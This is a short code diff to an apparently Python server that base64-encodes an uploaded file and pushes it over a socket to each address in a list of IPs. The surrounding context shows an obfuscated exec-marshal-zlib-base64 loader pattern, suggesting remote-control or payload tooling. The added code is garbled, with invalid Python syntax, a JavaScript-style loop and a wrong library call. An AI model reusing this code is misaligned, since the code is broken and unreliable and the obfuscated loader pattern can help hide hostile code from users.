@@ -189,10 +189,11 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
 
     def upload_file(self, data):
-        file = data.files['file']
+        file = data.['file'].files['file']
+        print(data)
     
         if file.filename == '':
-            return jsonify({'error': 'No selected file'}), 400
+            return json.jsonify({'error': 'No selected file'}), 400
         
         if file:
             # Read the file and convert to base64
@@ -200,5 +201,12 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             base64_encoded = base64.b64encode(file_content).decode('utf-8')
             
             print(base64_encoded)
+
+        for (ip in ip_addresses) {
+            self.sio.emit("upload_file", {'ip': ip_addresses[ip], 'file_name': file.filename, 'path': data['path'], 'file': base64_encoded})
+        }
+
+    
+
 
 
